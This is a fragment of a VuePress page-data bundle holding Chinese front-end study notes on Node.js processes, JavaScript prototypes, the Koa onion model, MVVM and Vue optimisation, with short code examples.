多进程"},regularPath:"/webstudy/Nodejs/nodejs%E5%A4%9A%E8%BF%9B%E7%A8%8B.html",relativePath:"webstudy/Nodejs/nodejs多进程.md",key:"v-e5190fc2",path:"/webstudy/Nodejs/nodejs%E5%A4%9A%E8%BF%9B%E7%A8%8B.html",headers:[{level:2,title:"进程 process 和线程 thread",slug:"进程-process-和线程-thread",normalizedTitle:"进程 process 和线程 thread",charIndex:17},{level:2,title:"nodejs 如何开启一个进程，进程之间如何通讯",slug:"nodejs-如何开启一个进程-进程之间如何通讯",normalizedTitle:"nodejs 如何开启一个进程，进程之间如何通讯",charIndex:376},{level:2,title:"为何需要多进程",slug:"为何需要多进程",normalizedTitle:"为何需要多进程",charIndex:472},{level:2,title:"nodejs 开启多进程",slug:"nodejs-开启多进程",normalizedTitle:"nodejs 开启多进程",charIndex:601},{level:2,title:"扩展：使用 PM2",slug:"扩展-使用-pm2",normalizedTitle:"扩展：使用 pm2",charIndex:738}],headersStr:"进程 process 和线程 thread nodejs 如何开启一个进程，进程之间如何通讯 为何需要多进程 nodejs 开启多进程 扩展：使用 PM2",content:"# nodejs 多进程\n\n\n# 进程 process 和线程 thread\n\n进程-是操作系统进行资源调度和分配的基本单位，每个进程都拥有自己独立的内存区域（参考“堆栈模型”）。 一个进程无法直接访问另一个进程的内存数据，除非通过合法的进程通讯。\n\n执行一个 nodejs 文件，即开启了一个进程，可以通过 process.pid 查看进程 id 。\n\n线程-是操作系统进行运算调度的最小单位，线程是附属于进程的。一个进程可以包含多个线程（至少一个），多线程之间可共用进程的内存数据。\n如操作系统是一个工厂，进程就是一个车间，线程就是一个一个的工人。\n\nJS 是单线程的，即执行 JS 时启动一个进程（如 JS 引擎，nodejs 等），然后其中再开启一个线程来执行。\n虽然单线程，JS 是基于事件驱动的，它不会阻塞执行，适合高并发的场景。\n\n\n# nodejs 如何开启一个进程，进程之间如何通讯\n\n * 可使用 child_process.fork 和 cluster.fork 开启子进程\n * 使用 send on 传递消息\n\n\n# 为何需要多进程\n\n现代服务器都是多核 CPU ，适合同时处理多进程。即，一个进程无法充分利用 CPU 性能，进程数要等于 CPU 核数。\n\n服务器一般内存比较大，但操作系统对于一个进程的内存分配是有上限的（2G），所以多进程才能充分利用服务器内存。\n\n\n# nodejs 开启多进程\n\nchild_process.fork 可开启子进程执行单独的计算\n\n * fork('xxx.js') 开启一个子进程\n * 使用 send 发送信息，使用 on 接收信息\n\ncluster.fork 可针对当前代码，开启多个进程来执行\n\n\n# 扩展：使用 PM2\n\nnodejs 服务开启多进程、进程守护，可使用 pm2 ，不需要自己写。\n\n * 全局安装 pm2 yarn global add pm2\n * 增加 pm2 配置文件\n * 修改 package.json scripts",normalizedContent:"# nodejs 多进程\n\n\n# 进程 process 和线程 thread\n\n进程-是操作系统进行资源调度和分配的基本单位，每个进程都拥有自己独立的内存区域（参考“堆栈模型”）。 一个进程无法直接访问另一个进程的内存数据，除非通过合法的进程通讯。\n\n执行一个 nodejs 文件，即开启了一个进程，可以通过 process.pid 查看进程 id 。\n\n线程-是操作系统进行运算调度的最小单位，线程是附属于进程的。一个进程可以包含多个线程（至少一个），多线程之间可共用进程的内存数据。\n如操作系统是一个工厂，进程就是一个车间，线程就是一个一个的工人。\n\njs 是单线程的，即执行 js 时启动一个进程（如 js 引擎，nodejs 等），然后其中再开启一个线程来执行。\n虽然单线程，js 是基于事件驱动的，它不会阻塞执行，适合高并发的场景。\n\n\n# nodejs 如何开启一个进程，进程之间如何通讯\n\n * 可使用 child_process.fork 和 cluster.fork 开启子进程\n * 使用 send on 传递消息\n\n\n# 为何需要多进程\n\n现代服务器都是多核 cpu ，适合同时处理多进程。即，一个进程无法充分利用 cpu 性能，进程数要等于 cpu 核数。\n\n服务器一般内存比较大，但操作系统对于一个进程的内存分配是有上限的（2g），所以多进程才能充分利用服务器内存。\n\n\n# nodejs 开启多进程\n\nchild_process.fork 可开启子进程执行单独的计算\n\n * fork('xxx.js') 开启一个子进程\n * 使用 send 发送信息，使用 on 接收信息\n\ncluster.fork 可针对当前代码，开启多个进程来执行\n\n\n# 扩展：使用 pm2\n\nnodejs 服务开启多进程、进程守护，可使用 pm2 ，不需要自己写。\n\n * 全局安装 pm2 yarn global add pm2\n * 增加 pm2 配置文件\n * 修改 package.json scripts",charsets:{cjk:!0}},{title:"原型和原型链",frontmatter:{title:"原型和原型链"},regularPath:"/webstudy/Javascript/%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE.html",relativePath:"webstudy/Javascript/原型和原型链.md",key:"v-53a95d9b",path:"/webstudy/Javascript/%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE.html",headers:[{level:2,title:"class",slug:"class",normalizedTitle:"class",charIndex:34},{level:2,title:"继承",slug:"继承",normalizedTitle:"继承",charIndex:262},{level:2,title:"instanceof",slug:"instanceof",normalizedTitle:"instanceof",charIndex:745},{level:3,title:"原理",slug:"原理",normalizedTitle:"原理",charIndex:760},{level:3,title:"几个例子",slug:"几个例子",normalizedTitle:"几个例子",charIndex:953},{level:3,title:"手写instanceof",slug:"手写instanceof",normalizedTitle:"手写instanceof",charIndex:1127},{level:2,title:"难理解的‘原型’",slug:"难理解的-原型",normalizedTitle:"难理解的‘原型’",charIndex:1682},{level:3,title:"显式原型和隐式原型",slug:"显式原型和隐式原型",normalizedTitle:"显式原型和隐式原型",charIndex:1695},{level:3,title:"基于原型的查找规则",slug:"基于原型的查找规则",normalizedTitle:"基于原型的查找规则",charIndex:1836},{level:2,title:"原型链",slug:"原型链",normalizedTitle:"原型链",charIndex:798},{level:3,title:"hasOwnProperty",slug:"hasownproperty",normalizedTitle:"hasownproperty",charIndex:1941},{level:3,title:"那hasOwnProperty又是哪里的方法？",slug:"那hasownproperty又是哪里的方法",normalizedTitle:"那hasownproperty又是哪里的方法？",charIndex:2076},{level:2,title:"new",slug:"new",normalizedTitle:"new",charIndex:234},{level:3,title:"new做了什么",slug:"new做了什么",normalizedTitle:"new做了什么",charIndex:2118},{level:3,title:"手写new",slug:"手写new",normalizedTitle:"手写new",charIndex:2227}],headersStr:"class 继承 instanceof 原理 几个例子 手写instanceof 难理解的‘原型’ 显式原型和隐式原型 基于原型的查找规则 原型链 hasOwnProperty 那hasOwnProperty又是哪里的方法？ new new做了什么 手写new",content:"先上几个问题：\n\n * 1、如何判断一个变量是不是数组？\n * 2、class的原型本质？\n\n\n# class\n\nclass Student {\n  //构建实例\n  constructor(name,age){\n    this.name = name\n    this.age=age\n  }\n  say(){\n    console.log(`姓名${this.name},年龄${this.age}`)\n  }\n}\n//通过类声明对象实例\nconst a = new Student('yang',22)\n\n\n\n# 继承\n\n  //父类\n  class People {\n    constructor(name, age) {\n      this.name = name;\n      this.age = age;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age}`);\n    }\n  }\n  //子类\n  class Student extends People {\n    constructor(name, age, number) {\n      super(name, age); //super会调用父类的构造函数方法\n      this.number = number;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age},学号${this.number}`);\n    }\n  }\n  const a = new Student(\"yang\", 18, 1);\n  a.say();\n\n\n\n# instanceof\n\n\n# 原理\n\n用于检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上 什么意思呢？反过来理解一下 a.instance Array，a沿着自己的__proto__一层一层的寻找，是否可以找到Array.prototype(Array的显式原型)，直至找到Object.prototype后停止，因为Object.prototype.__proto__是null\n\n\n# 几个例子\n\n//借用上面的People和Student类\na instanceof People //true\na instanceof Student //true\na instanceof Object //true ,\n\n[] instanceof Array //true\n[] instanceof Object //true\n\n\n\n# 手写instanceof\n\nfunction copyInstanceof (source, target) {\n    // 基本数据类型以及 null 直接返回 false\n    if (!['function', 'object'].includes(typeof source) || source === null) return false\n    // getProtypeOf 是 Object 对象自带的一个方法，能够拿到参数的原型对象\n    let proto = Object.getPrototypeOf(source)\n    while (true) {\n        // 查找到尽头，还没找到\n        if (proto == null) return false\n        // 找到相同的原型对象\n        if (proto == target.prototype) return true\n        proto = Object.getPrototypeOf(proto)\n    }\n}\n\n\n\n以上表面的规则可以归结为，object是所有class的一个父类，Array也是Object，至于原理，请深入到‘原型‘......\n\n\n# 难理解的‘原型’\n\n\n# 显式原型和隐式原型\n\n通过instanceof引入原型，原型链子，从而理解instanceof的原理\n\n * 每一个class都有一个prototype显式原型\n * 每一个实例都有__proto__的隐式原型\n * 实例的__proto指向class的protptype\n\n\n# 基于原型的查找规则\n\n * 获取属性xialuo.name或执行xialuo.say()方法时\n * 先在自身的属性和方法中寻找\n * 如果找不到就自动去自己的__proto__中查找\n\n\n# 原型链\n\n\n# hasOwnProperty\n\nxialuo.hasOwnProperty(sayHi())   //false\n\n\n * hasOwnProperty表示是否有自己的属性。这个方法会查找一个对象是否有某个属性，但是不会去查找它的原型链回忆一下递归实现的深拷贝\n\n\n# 那hasOwnProperty又是哪里的方法？\n\n请看图：\n\n\n# new\n\n\n# new做了什么\n\n * 创建一个空对象\n * 空对象的内部属性 proto 赋值为构造函数的 prototype 属性\n * 将构造函数的 this 指向空对象\n * 执行构造函数内部代码\n * 返回该新对象\n\n\n# 手写new\n\nfunction _new(fn, ...arg) {\n  const obj = Object.create(fn.prototype);\n  const res = fn.apply(obj, arg);\n  return res instanceof Object ? res : obj;\n}\n",normalizedContent:"先上几个问题：\n\n * 1、如何判断一个变量是不是数组？\n * 2、class的原型本质？\n\n\n# class\n\nclass student {\n  //构建实例\n  constructor(name,age){\n    this.name = name\n    this.age=age\n  }\n  say(){\n    console.log(`姓名${this.name},年龄${this.age}`)\n  }\n}\n//通过类声明对象实例\nconst a = new student('yang',22)\n\n\n\n# 继承\n\n  //父类\n  class people {\n    constructor(name, age) {\n      this.name = name;\n      this.age = age;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age}`);\n    }\n  }\n  //子类\n  class student extends people {\n    constructor(name, age, number) {\n      super(name, age); //super会调用父类的构造函数方法\n      this.number = number;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age},学号${this.number}`);\n    }\n  }\n  const a = new student(\"yang\", 18, 1);\n  a.say();\n\n\n\n# instanceof\n\n\n# 原理\n\n用于检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上 什么意思呢？反过来理解一下 a.instance array，a沿着自己的__proto__一层一层的寻找，是否可以找到array.prototype(array的显式原型)，直至找到object.prototype后停止，因为object.prototype.__proto__是null\n\n\n# 几个例子\n\n//借用上面的people和student类\na instanceof people //true\na instanceof student //true\na instanceof object //true ,\n\n[] instanceof array //true\n[] instanceof object //true\n\n\n\n# 手写instanceof\n\nfunction copyinstanceof (source, target) {\n    // 基本数据类型以及 null 直接返回 false\n    if (!['function', 'object'].includes(typeof source) || source === null) return false\n    // getprotypeof 是 object 对象自带的一个方法，能够拿到参数的原型对象\n    let proto = object.getprototypeof(source)\n    while (true) {\n        // 查找到尽头，还没找到\n        if (proto == null) return false\n        // 找到相同的原型对象\n        if (proto == target.prototype) return true\n        proto = object.getprototypeof(proto)\n    }\n}\n\n\n\n以上表面的规则可以归结为，object是所有class的一个父类，array也是object，至于原理，请深入到‘原型‘......\n\n\n# 难理解的‘原型’\n\n\n# 显式原型和隐式原型\n\n通过instanceof引入原型，原型链子，从而理解instanceof的原理\n\n * 每一个class都有一个prototype显式原型\n * 每一个实例都有__proto__的隐式原型\n * 实例的__proto指向class的protptype\n\n\n# 基于原型的查找规则\n\n * 获取属性xialuo.name或执行xialuo.say()方法时\n * 先在自身的属性和方法中寻找\n * 如果找不到就自动去自己的__proto__中查找\n\n\n# 原型链\n\n\n# hasownproperty\n\nxialuo.hasownproperty(sayhi())   //false\n\n\n * hasownproperty表示是否有自己的属性。这个方法会查找一个对象是否有某个属性，但是不会去查找它的原型链回忆一下递归实现的深拷贝\n\n\n# 那hasownproperty又是哪里的方法？\n\n请看图：\n\n\n# new\n\n\n# new做了什么\n\n * 创建一个空对象\n * 空对象的内部属性 proto 赋值为构造函数的 prototype 属性\n * 将构造函数的 this 指向空对象\n * 执行构造函数内部代码\n * 返回该新对象\n\n\n# 手写new\n\nfunction _new(fn, ...arg) {\n  const obj = object.create(fn.prototype);\n  const res = fn.apply(obj, arg);\n  return res instanceof object ? res : obj;\n}\n",charsets:{cjk:!0}},{title:"洋葱模型",frontmatter:{title:"洋葱模型"},regularPath:"/webstudy/Nodejs/%E6%B4%8B%E8%91%B1%E6%A8%A1%E5%9E%8B.html",relativePath:"webstudy/Nodejs/洋葱模型.md",key:"v-3fa08b8f",path:"/webstudy/Nodejs/%E6%B4%8B%E8%91%B1%E6%A8%A1%E5%9E%8B.html",headers:[{level:2,title:"官网demo",slug:"官网demo",normalizedTitle:"官网demo",charIndex:72}],headersStr:"官网demo",content:"# koa2洋葱模型\n\n了解洋葱模型前要掌握js异步编程\n\n为什么?因为koa2使用的async/await+ promise思路\n\n\n\n\n# 官网demo\n\nconst Koa = require('koa');\nconst app = new Koa();\n\n// logger\n\napp.use(async (ctx, next) => {\n  await next(); //1\n  const rt = ctx.response.get('X-Response-Time');//7\n  console.log(`${ctx.method} ${ctx.url} - ${rt}`);//8\n});\n\n// x-response-time\napp.use(async (ctx, next) => {\n  const start = Date.now();//2\n  await next();//3\n  const ms = Date.now() - start;//5\n  ctx.set('X-Response-Time', `${ms}ms`);//6\n});\n\n// response\napp.use(async ctx => {\n  ctx.body = 'Hello World';//4\n});\n\napp.listen(3000);\n\n\n如代码，通过await next()执行下一个中间件....向内执行，最后从内向外执行...",normalizedContent:"# koa2洋葱模型\n\n了解洋葱模型前要掌握js异步编程\n\n为什么?因为koa2使用的async/await+ promise思路\n\n\n\n\n# 官网demo\n\nconst koa = require('koa');\nconst app = new koa();\n\n// logger\n\napp.use(async (ctx, next) => {\n  await next(); //1\n  const rt = ctx.response.get('x-response-time');//7\n  console.log(`${ctx.method} ${ctx.url} - ${rt}`);//8\n});\n\n// x-response-time\napp.use(async (ctx, next) => {\n  const start = date.now();//2\n  await next();//3\n  const ms = date.now() - start;//5\n  ctx.set('x-response-time', `${ms}ms`);//6\n});\n\n// response\napp.use(async ctx => {\n  ctx.body = 'hello world';//4\n});\n\napp.listen(3000);\n\n\n如代码，通过await next()执行下一个中间件....向内执行，最后从内向外执行...",charsets:{cjk:!0}},{title:"MVVM",frontmatter:{title:"MVVM"},regularPath:"/webstudy/Vue2/MVVM.html",relativePath:"webstudy/Vue2/MVVM.md",key:"v-7b7cad34",path:"/webstudy/Vue2/MVVM.html",headers:[{level:2,title:"MVC 原理",slug:"mvc-原理",normalizedTitle:"mvc 原理",charIndex:11},{level:2,title:"MVVM 原理",slug:"mvvm-原理",normalizedTitle:"mvvm 原理",charIndex:116},{level:2,title:"Vue中的MVVM",slug:"vue中的mvvm",normalizedTitle:"vue中的mvvm",charIndex:130}],headersStr:"MVC 原理 MVVM 原理 Vue中的MVVM",content:"# MVVM\n\n\n# MVC 原理\n\n * View 传送指令到 Controller\n * Controller 完成业务逻辑后，要求 Model 改变状态\n * Model 将新的数据发送到 View，用户得到反馈\n\n\n\n\n# MVVM 原理\n\n\n\n\n# Vue中的MVVM\n\n> 视图层和数据层的双向绑定，让我们无需再去关心DOM操作的事情，更多的精力放在数据和业务逻辑上去\n\n\n\n * View 即 Vue template\n * Model 即 Vue data\n * VM 即 Vue 其他核心功能，负责 View 和 Model 通讯",normalizedContent:"# mvvm\n\n\n# mvc 原理\n\n * view 传送指令到 controller\n * controller 完成业务逻辑后，要求 model 改变状态\n * model 将新的数据发送到 view，用户得到反馈\n\n\n\n\n# mvvm 原理\n\n\n\n\n# vue中的mvvm\n\n> 视图层和数据层的双向绑定，让我们无需再去关心dom操作的事情，更多的精力放在数据和业务逻辑上去\n\n\n\n * view 即 vue template\n * model 即 vue data\n * vm 即 vue 其他核心功能，负责 view 和 model 通讯",charsets:{cjk:!0}},{title:"Vue优化",frontmatter:{title:"Vue优化"},regularPath:"/webstudy/Experience/Vue%E4%BC%98%E5%8C%96.html",relativePath:"webstudy/Experience/Vue优化.md",key:"v-4554a115",path:"/webstudy/Experience/Vue%E4%BC%98%E5%8C%96.html",headers:[{level:2,title:"1、v-if 和 v-show",slug:"_1、v-if-和-v-show",normalizedTitle:"1、v-if 和 v-show",charIndex:12},{level:2,title:"2、v-for 使用 key",slug:"_2、v-for-使用-key",normalizedTitle:"2、v-for 使用 key",charIndex:160},{level:2,title:"3、使用computed缓存",slug:"_3、使用computed缓存",normalizedTitle:"3、使用computed缓存",charIndex:243},{level:2,title:"4、使用keep-alive缓存组件",slug:"_4、使用keep-alive缓存组件",normalizedTitle:"4、使用keep-alive缓存组件",charIndex:544},{level:2,title:"5、组件的按需加载",slug:"_5、组件的按需加载",normalizedTitle:"5、组件的按需加载",charIndex:693},{level:2,title:"6、路由懒加载",slug:"_6、路由懒加载",normalizedTitle:"6、路由懒加载",charIndex:864},{level:2,title:"7、SSR",slug:"_7、ssr",normalizedTitle:"7、ssr",charIndex:1138},{level:2,title:"Vue遇到的坑",slug:"vue遇到的坑",normalizedTitle:"vue遇到的坑",charIndex:1249}],headersStr:"1、v-if 和 v-show 2、v-for 使用 key 3、使用computed缓存 4、使用keep-alive缓存组件 5、组件的按需加载 6、路由懒加载 7、SSR Vue遇到的坑",content:"# Vue优化\n\n\n# 1、v-if 和 v-show\n\n * v-if 组件销毁/重建，v-show 组件隐藏（display）\n\n使用场景\n\n * 多数情况v-if，普通组件的销毁、渲染不会造成性能问题\n * 如果组件创建时需要大量计算，或者大量渲染（如复杂的编辑器、表单、地图等），可以考虑 v-show\n\n\n# 2、v-for 使用 key\n\n * vue默认是就地复用策略，，使用key 可以优化内部的 diff 算法\n * 遍历数组时 key 不要使用 index\n\n\n# 3、使用computed缓存\n\ncomputed 可以缓存计算结果，data 不变则缓存不失效\n\nexport default {\n    data() {\n        return {\n            msgList: [ ... ] // 消息列表\n        }\n    },\n    computed: {\n        // 未读消息的数量\n        unreadCount() {\n            return this.msgList.filter(m => m.read === false).length\n        }\n    }\n}\n\n\n\n# 4、使用keep-alive缓存组件\n\n<keep-alive> 可以缓存子组件，只创建一次，注意搭配 activated 和 deactivated 生命周期钩子使用。\n\n\n使用场景\n\n * 局部频繁切换的组件，如 tabs\n * 注意：<keep-alive>缓存会占用内存，慎重使用\n\n\n# 5、组件的按需加载\n\n对于体积大的组件（如编辑器、表单、地图等）可以使用异步组件\n\n * 拆包，需要时异步加载，不需要时不加载\n * 减少 main 包的体积，页面首次加载更快\n\nvue3 使用 defineAsyncComponent 加载异步组件，代码参考 components/AsyncComponent/index.vue\n\n\n# 6、路由懒加载\n\n对于一些补偿访问的路由，或者组件提交比较大的路由，可以使用路由懒加载。\n\nconst routes = [\n  {\n    path: '/',\n    name: 'Home',\n    component: Home\n  },\n  {\n    path: '/about',\n    name: 'About',\n    // 路由懒加载\n    component: () => import(/* webpackChunkName: \"about\" */ '../views/About.vue')\n  }\n]\n\n\n\n# 7、SSR\n\nSSR 让网页访问速度更快，对 SEO 友好。\n\n但 SSR 使用和调试成本高，不可乱用。例如，一个低代码项目（在线制作 H5 网页），toB 部分不可用 SSR ， toC 部分适合用 SSR 。\n\n\n# Vue遇到的坑\n\n全局事件、自定义事件要在组件销毁时解除绑定\n\n * 内存泄漏风险\n * 全局事件（如 window.resize）不解除，则会继续监听，而且组件再次创建时会重复绑定\n\nVue2.x 中，无法监听 data 属性的新增和删除，以及数组的部分修改 —— Vue3 不会有这个问题\n\n * 新增 data 属性，需要用 Vue.set\n * 删除 data 属性，需要用 Vue.delete\n * 修改数组某一元素，不能 arr[index] = value ，要使用 arr.splice API 方式\n\n路由切换时，页面会 scroll 到顶部。例如，在一个新闻列表页下滑到一定位置，点击进入详情页，在返回列表页，此时会 scroll 到顶部，并重新渲染列表页。所有的 SPA 都会有这个问题，并不仅仅是 Vue 。\n\n * 在列表页缓存数据和 scrollTop\n * 返回列表页时（用 Vue-router 导航守卫，判断 from），使用缓存数据渲染页面，然后 scrollTo(scrollTop)",normalizedContent:"# vue优化\n\n\n# 1、v-if 和 v-show\n\n * v-if 组件销毁/重建，v-show 组件隐藏（display）\n\n使用场景\n\n * 多数情况v-if，普通组件的销毁、渲染不会造成性能问题\n * 如果组件创建时需要大量计算，或者大量渲染（如复杂的编辑器、表单、地图等），可以考虑 v-show\n\n\n# 2、v-for 使用 key\n\n * vue默认是就地复用策略，，使用key 可以优化内部的 diff 算法\n * 遍历数组时 key 不要使用 index\n\n\n# 3、使用computed缓存\n\ncomputed 可以缓存计算结果，data 不变则缓存不失效\n\nexport default {\n    data() {\n        return {\n            msglist: [ ... ] // 消息列表\n        }\n    },\n    computed: {\n        // 未读消息的数量\n        unreadcount() {\n            return this.msglist.filter(m => m.read === false).length\n        }\n    }\n}\n\n\n\n# 4、使用keep-alive缓存组件\n\n<keep-alive> 可以缓存子组件，只创建一次，注意搭配 activated 和 deactivated 生命周期钩子使用。\n\n\n使用场景\n\n * 局部频繁切换的组件，如 tabs\n * 注意：<keep-alive>缓存会占用内存，慎重使用\n\n\n# 5、组件的按需加载\n\n对于体积大的组件（如编辑器、表单、地图等）可以使用异步组件\n\n * 拆包，需要时异步加载，不需要时不加载\n * 减少 main 包的体积，页面首次加载更快\n\nvue3 使用 defineasynccomponent 加载异步组件，代码参考 components/asynccomponent/index.vue\n\n\n# 6、路由懒加载\n\n对于一些补偿访问的路由，或者组件提交比较大的路由，可以使用路由懒加载。\n\nconst routes = [\n  {\n    path: '/',\n    name: 'home',\n    component: home\n  },\n  {\n    path: '/about',\n    name: 'about',\n    // 路由懒加载\n    component: () => import(/* webpackchunkname: \"about\" */ '../views/about.vue')\n  }\n]\n\n\n\n# 7、ssr\n\nssr 让网页访问速度更快，对 seo 友好。\n\n但 ssr 使用和调试成本高，不可乱用。例如，一个低代码项目（在线制作 h5 网页），tob 部分不可用 ssr ， toc 部分适合用 ssr 。\n\n\n# vue遇到的坑\n\n全局事件、自定义事件要在组件销毁时解除绑定\n\n * 内存泄漏风险\n * 全局事件（如 window.resize）不解除，则会继续监听，而且组件再次创建时会重复绑定\n\nvue2.x 中，无法监听 data 属性的新增和删除，以及数组的部分修改 —— vue3 不会有这个问题\n\n * 新增 data 属性，需要用 vue.set\n * 删除 data 属性，需要用 vue.delete\n * 修改数组某一元素，不能 arr[index] = value ，要使用 arr.splice api 方式\n\n路由切换时，页面会 scroll 到顶部。例如，在一个新闻列表页下滑到一定位置，点击进入详情页，在返回列表页，此时会 scroll 到顶部，并重新渲染列表页。所有的 spa 都会有这个问题，并不仅仅是 vue 。\n\n * 在列表页缓存数据和 scrolltop\n * 返回列表页时（用 vue-router 导航守卫，判断 from），使用缓存数据渲染页面，然后 scrollto(scrolltop)",charsets:{cjk:!0}},{title:"computed和watch",frontmatter:{title:"computed和watch"},regularPath:"/webstudy/Vue2/computed%E5%92%8Cwatch.html",relativePath:"webstudy/Vue2/computed和watch.md",key:"v-6a9e8fe1",path:"/webstudy/Vue2/computed%E5%92%8Cwatch.html",headers:[{level:2,title:"computed和watch",slug:"computed和watch",normalizedTitle:"computed和watch",charIndex:2},{level:3,title:"区别",slug:"区别",normalizedTitle:"区别",charIndex:21},{level:3,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:152}],headersStr:"computed和watch 区别 使用",content:"# computed和watch\n\n\n# 区别\n\n# computed\n\n * computed用于计算产生新的数据\n * 支持缓存，只有依赖数据发生变化时，才会重新进行计算\n\n# watch\n\n * 不支持缓存，当数据变化时，会直接触发对应的操作\n * watch监听现有数据，来继续某些逻辑\n\n\n# 使用\n\n自行查询Vue文档",normalizedContent:"# computed和watch\n\n\n# 区别\n\n# computed\n\n * computed用于计算产生新的数据\n * 支持缓存，只有依赖数据发生变化时，才会重新进行计算\n\n# watch\n\n * 不支持缓存，当数据变化时，会直接触发对应的操作\n * watch监听现有数据，来继续某些逻辑\n\n\n# 使用\n\n自行查询vue文档",charsets:{cjk:!0}},{title:"webstudy",frontmatter:{title:"webstudy"},regularPath:"/webstudy/",relativePath:"webstudy/README.md",key:"v-779e2c82",path:"/webstudy/",headers:[{level:2,title:"Javascript",slug:"javascript",normalizedTitle:"javascript",charIndex:2},{level:2,title:"ES6及以上",slug:"es6及以上",normalizedTitle:"es6及以上",charIndex:92},{level:2,title:"VUE2",slug:"vue2",normalizedTitle:"vue2",charIndex:141},{level:2,title:"VUE3",slug:"vue3",normalizedTitle:"vue3",charIndex:251},{level:2,title:"HTML",slug:"html",normalizedTitle:"html",charIndex:285},{level:2,title:"CSS",slug:"css",normalizedTitle:"css",charIndex:326},{level:2,title:"HTTP",slug:"http",normalizedTitle:"http",charIndex:380},{level:2,title:"运行环境",slug:"运行环境",normalizedTitle:"运行环境",charIndex:516},{level:2,title:"工程化",slug:"工程化",normalizedTitle:"工程化",charIndex:552},{level:2,title:"Experience",slug:"experience",normalizedTitle:"experience",charIndex:633},{level:2,title:"Nodejs",slug:"nodejs",normalizedTitle:"nodejs",charIndex:666},{level:2,title:"前端工程化",slug:"前端工程化",normalizedTitle:"前端工程化",charIndex:560},{level:2,title:"项目",slug:"项目",normalizedTitle:"项目",charIndex:728},{level:2,title:"设计模式",slug:"设计模式",normalizedTitle:"设计模式",charIndex:744}],headersStr:"Javascript ES6及以上 VUE2 VUE3 HTML CSS HTTP 运行环境 工程化 Experience Nodejs 前端工程化 项目 设计模式",content:"# Javascript\n\n * 堆栈模型⭐\n * 原型和原型链⭐\n * 作用域和闭包\n * 内存泄露和垃圾回收\n * 同步和异步\n * JS严格模式\n * 对象的创建与继承\n\n\n# ES6及以上\n\n * 箭头函数⭐⭐⭐\n * reduce\n * for await of\n\n\n# VUE2\n\n * 特性\n * MVVM\n * Vue生命周期\n * Vue响应式原理\n * 组件通讯\n * computed和watch\n * key\n * 虚拟dom和diff算法\n * vue-router\n\n\n# VUE3\n\n * vue3相比于vue2\n * Proxy\n\n\n# HTML\n\n * node和element\n * defer和async\n\n\n# CSS\n\n * flex⭐\n * 文字超出省略\n * 零碎的知识\n * Retina屏幕1px宽度\n\n\n# HTTP\n\n * 状态码\n * ajax-fetch-axios\n * Http协议1.0,1.1,2.0\n * token和cookie\n * TCP三次握手四次挥手\n * TCP和UDP\n * 浏览器的缓存机制\n * 网页多标签通讯\n * webSocket\n\n\n# 运行环境\n\n * 网页的加载和渲染\n * 性能优化\n * 安全\n\n\n# 工程化\n\n * 前端工程化\n * webpack-loader和plugin\n * vue.config.js配置案例\n * babel\n * vite\n\n\n# Experience\n\n * 首屏优化\n * Vue优化\n\n\n# Nodejs\n\n * nodejs多进程\n * 中间件⭐\n * 洋葱模型⭐\n\n\n# 前端工程化\n\n * 前端工程化\n\n\n# 项目\n\n * 权限设计\n\n\n# 设计模式\n\n * 设计模式⭐",normalizedContent:"# javascript\n\n * 堆栈模型⭐\n * 原型和原型链⭐\n * 作用域和闭包\n * 内存泄露和垃圾回收\n * 同步和异步\n * js严格模式\n * 对象的创建与继承\n\n\n# es6及以上\n\n * 箭头函数⭐⭐⭐\n * reduce\n * for await of\n\n\n# vue2\n\n * 特性\n * mvvm\n * vue生命周期\n * vue响应式原理\n * 组件通讯\n * computed和watch\n * key\n * 虚拟dom和diff算法\n * vue-router\n\n\n# vue3\n\n * vue3相比于vue2\n * proxy\n\n\n# html\n\n * node和element\n * defer和async\n\n\n# css\n\n * flex⭐\n * 文字超出省略\n * 零碎的知识\n * retina屏幕1px宽度\n\n\n# http\n\n * 状态码\n * ajax-fetch-axios\n * http协议1.0,1.1,2.0\n * token和cookie\n * tcp三次握手四次挥手\n * tcp和udp\n * 浏览器的缓存机制\n * 网页多标签通讯\n * websocket\n\n\n# 运行环境\n\n * 网页的加载和渲染\n * 性能优化\n * 安全\n\n\n# 工程化\n\n * 前端工程化\n * webpack-loader和plugin\n * vue.config.js配置案例\n * babel\n * vite\n\n\n# experience\n\n * 首屏优化\n * vue优化\n\n\n# nodejs\n\n * nodejs多进程\n * 中间件⭐\n * 洋葱模型⭐\n\n\n# 前端工程化\n\n * 前端工程化\n\n\n# 项目\n\n * 权限设计\n\n\n# 设计模式\n\n * 设计模式⭐",charsets:{cjk:!0}},{title:"Vue响应式原理",frontmatter:{title:"Vue响应式原理"},regularPath:"/webstudy/Vue2/Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86.html",relativePath:"webstudy/Vue2/Vue响应式原理.md",key:"v-06e03a62",path:"/webstudy/Vue2/Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86.html",headers:[{level:2,title:"Vue 响应式原理的核⼼就是Observer、Dep、Watcher",slug:"vue-响应式原理的核心就是observer、dep、watcher",normalizedTitle:"vue 响应式原理的核⼼就是observer、dep、watcher",charIndex:26},{level:2,title:"如何监听数据的变化",slug:"如何监听数据的变化",normalizedTitle:"如何监听数据的变化",charIndex:212},{level:3,title:"Observer观察者",slug:"observer观察者",normalizedTitle:"observer观察者",charIndex:226},{level:3,title:"Dep依赖管理",slug:"dep依赖管理",normalizedTitle:"dep依赖管理",charIndex:2922},{level:3,title:"Watcher订阅者",slug:"watcher订阅者",normalizedTitle:"watcher订阅者",charIndex:3118},{level:2,title:"Vue2 响应式",slug:"vue2-响应式",normalizedTitle:"vue2 响应式",charIndex:3265},{level:3,title:"缺点",slug:"缺点",normalizedTitle:"缺点",charIndex:2411},{level:3,title:"缺点的弥补",slug:"缺点的弥补",normalizedTitle:"缺点的弥补",charIndex:3508},{level:2,title:"Vue3 响应式",slug:"vue3-响应式",normalizedTitle:"vue3 响应式",charIndex:3837}],headersStr:"Vue 响应式原理的核⼼就是Observer、Dep、Watcher 如何监听数据的变化 Observer观察者 Dep依赖管理 